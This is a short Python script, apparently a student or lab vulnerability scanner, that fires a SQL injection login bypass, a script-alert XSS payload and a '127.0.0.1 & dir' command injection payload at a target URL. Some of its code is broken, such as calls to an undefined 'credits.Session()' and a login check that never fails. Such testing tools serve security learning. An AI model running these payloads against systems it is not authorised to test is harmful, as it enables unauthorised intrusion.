import sys
import requests

def create_session():
    session = requests.Session()
    return session

# Function to test SQL Injection
def test_sql_injection(base_url, session):
    if session == None:
        print("No session")
        session = create_session()

    login_url = f"{base_url}"
    payload = {"username": "admin' OR '1'='1", "password": "anything"}
    try:
        response = session.post(login_url, data=payload)
        print("\n[DEBUG] SQL Injection Response:")
        print(login_url)
        #print(response.text)  # Print the response for debugging

        if "Welcome" in response.text or "Dashboard" in response.text:
            print("[+] SQL Injection successful! Logged in as admin.")
            return("[+] SQL Injection successful! Logged in as admin.")
        else:
            return("[-] SQL Injection failed.")
    except Exception as e:
        return(f"[-] Error while testing SQL Injection: {e}")

# Function to test XSS
def test_xss(base_url, session):
    feedback_url = f"{base_url}/feedback"
    payload = {"name": "<script>alert('XSS');</script>", "feedback": "This is a harmless test."}
    try:
        response = session.post(feedback_url, data=payload)
        print("\n[DEBUG] XSS Response:")
        print(feedback_url)
        #print(response.text)  # Print the response for debugging

        if "<script>alert('XSS');</script>" in response.text:
            print("[+] XSS vulnerability confirmed! Payload executed.")
            return("[+] XSS vulnerability confirmed! Payload executed.")
            
        else:
            return("[-] XSS payload was not executed.")
    except Exception as e:
        return(f"[-] Error while testing XSS: {e}")
    


# Function to test Command Injection
# Function to test Command Injection
def test_command_injection(base_url, session):
    ping_url = f"{base_url}/ping"
    payload = {"ip": "127.0.0.1 & dir"}  # Use 'ls' for Linux/Mac
    try:
        # Use POST to match the HTML form's method
        response = session.post(ping_url, data=payload)
        print("\n[DEBUG] Command Injection Response:")
        print(ping_url)
        #print(response.text)  # Print the response for debugging

        if "Directory" in response.text or "Volume" in response.text or "bin" in response.text:
            print("[+] Command Injection successful!")
            return("[+] Command Injection successful!")

        else:
            return("[-] Command Injection failed.")
    except Exception as e:
        return(f"[-] Error while testing Command Injection: {e}")
    

def xss_only(base_url):
    session = credits.Session()
    test_sql_injection(base_url,session)
    test_xss(base_url,session)

def command_only(base_url):
    session = credits.Session()
    test_sql_injection(base_url,session)
    test_command_injection(base_url,session)


# Main function
def main():
    if len(sys.argv) != 2:
        print("Usage: python web_scanner.py <target_url>")
        sys.exit(1)

    base_url = sys.argv[1]

    print("=== Vulnerability Scanner ===")
    #base_url = 'http://127.0.0.1:5000'

    print("\n[+] Running tests...")

    # Create a session to handle cookies
    session = create_session()
    # Run SQL Injection Test
    sql_logged_in = test_sql_injection(base_url, session)

    if not sql_logged_in:
        print("[-] Skipping further tests as login was not successful.")
        return

    # Run XSS Test
    test_xss(base_url, session)

    # Run Command Injection Test
    test_command_injection(base_url, session)

if __name__ == "__main__":
    main()

   

